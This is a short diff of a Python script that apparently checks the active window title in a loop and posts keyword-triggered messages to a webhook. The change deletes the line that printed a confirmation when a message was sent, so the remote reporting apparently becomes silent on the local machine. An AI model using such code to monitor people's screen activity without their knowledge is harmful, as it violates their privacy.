@@ -41,7 +41,6 @@ def send_message(keyword):
         }]
     }
     requests.post(hook, json=payload)
-    print(f"✅ Sent message for: {keyword}")
 
 while True:
     active_window = get_active_window_title()
